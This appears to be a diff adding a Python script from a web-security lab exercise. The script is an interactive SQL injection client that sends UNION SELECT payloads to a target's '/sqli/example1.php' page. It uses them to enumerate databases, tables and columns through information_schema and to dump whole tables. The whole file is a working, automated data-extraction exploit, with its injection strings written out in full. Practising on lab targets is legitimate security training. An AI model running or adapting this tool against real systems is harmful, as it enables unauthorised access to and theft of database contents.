@@ -1,0 +1,138 @@
+#!/usr/bin/python3
+
+import subprocess
+import sys
+import os
+import requests
+from prettytable import PrettyTable
+
+
+def interactive_shell(site_IP):
+    while True:
+        in_str = input('lab3sqli> ')
+        if in_str == "exit":
+            print('Good bye')
+            break
+        else:
+            args = in_str.split()
+            if args[0] == "dbs":
+                url = calculate_url(db=args[0], table='', column='', command_type=1)
+            elif args[0] == "tables":
+                url = calculate_url(db=args[1], table='', column='', command_type=2)
+            elif args[0] == "columns":
+                url = calculate_url(db=args[1], table=args[2], column='column_name', command_type=3)
+            elif args[0] == "dump":
+                #get list of columns
+                url = calculate_url(db=args[1], table=args[2], column='column_name', command_type=3)
+                response = handle_requests(url)
+                columns_list = parse_response(response)
+                #get number of tables
+                num_rows_url = calculate_url(db='', table=args[2], column='', command_type=5)
+                response = handle_requests(num_rows_url)
+                num_rows_list = parse_response(response)
+                num_rows = int(*num_rows_list[0])
+                #get dictionary of lists column:values
+                dump_dict = {}
+                for x in range(len(columns_list[0])):
+                    c = columns_list[0][x]
+                    url = calculate_url(db=args[1], table=args[2], column=c, command_type=4)
+                    response = handle_requests(url)
+                    results_list = parse_response(response)
+                    dump_dict.update({c:results_list[0]})
+                print(dump_pretty_print(dump_dict, columns_list, num_rows))
+
+            if args[0] != "dump":
+                response = handle_requests(url)
+                list_of_print_lists = parse_response(response)
+                print(pretty_print(list_of_print_lists))
+                #better parse args function
+
+
+#print output in prett table
+def pretty_print(list_of_print_lists):
+    myTable = PrettyTable(*list_of_print_lists)#[0])
+    #print(*list_of_print_lists)
+    if len(list_of_print_lists) > 1:
+        for x in list_of_print_lists:
+            for y in x:
+                myTable.add_row(y)
+    return myTable
+
+
+#print dumped table in pretty output
+def dump_pretty_print(dump_dict, columns_list, num_rows): #need xd array/list to hold all the stuff
+    myTable = PrettyTable(*columns_list)
+    usable_list = []
+    outer_usable_list = []
+    for x in range(num_rows):
+        for y in columns_list[0]:
+            usable_list.append(dump_dict[y][x])
+        myTable.add_row(usable_list)
+        usable_list = []
+    return myTable
+
+
+#parse through html and return relevant data as a list of lists
+def parse_response(response):
+    list = response.split('\n')
+    print_list = []
+    list_of_print_lists = []
+    up_next = False
+    value = 0
+    for x in list:
+        x = x.replace('\n', '')
+        x = x.replace('\t', '')
+        if up_next: #line in response that includes the desired data
+            y = x.split()
+            results = ''.join([str(s) for s in y[1:-2]]) #only grab index 1 through 2nd to last index
+            results = results.split(',')
+            list_of_print_lists.append(results)
+            break
+        no_spaces = x.replace(' ', '')
+        if no_spaces == '<tr><th>id</th><th>name</th><th>age</th></tr>':
+            up_next = True
+    return list_of_print_lists
+
+
+#send and retrieve the responses
+def handle_requests(url):
+    response = requests.get(url)
+    response = response.text
+    return response
+
+
+#format the appropriate url/sql injection
+def calculate_url(db, table, column, command_type):
+    s = 'schema_name'
+    t = 'table_name'
+    c = 'column_name'
+    base_url = f'http://{site_IP}/sqli/example1.php?name=root'
+    if command_type == 1:
+        injection = f'\' union select group_concat(" ",{s}," "),NULL,NULL,NULL,NULL from ' \
+                    f'information_schema.schemata%23'
+    elif command_type == 2:
+        injection = f'\' union select group_concat(" ",{t}," "),NULL,NULL,NULL,NULL from information_schema.tables ' \
+                    f'where table_schema="{db}"%23'
+    elif command_type == 3:
+        injection = f'\' union select group_concat(" ",{c}," "),NULL,NULL,NULL,NULL from information_schema.columns ' \
+                    f'where table_name="{table}"%23'
+    elif command_type == 4:
+        injection = f'\' union select group_concat(" ",{column}," "),NULL,NULL,NULL,NULL from {table}%23'
+    elif command_type == 5:
+        injection = f'\' union select group_concat(" ",table_rows," "),NULL,NULL,NULL,NULL from ' \
+                    f'information_schema.tables where table_name="{table}"%23'
+
+    return base_url + injection
+
+
+if __name__ == "__main__":
+    n = len(sys.argv)
+    if n != 2:
+        print('Enter Server IP address')
+        print(f'Total arguments passed: {n}')
+    else:
+        args = sys.argv[1:]
+        site_IP = args[0]
+        interactive_shell(site_IP)
+        if os.path.exists("temp.html"):
+            os.remove("temp.html")
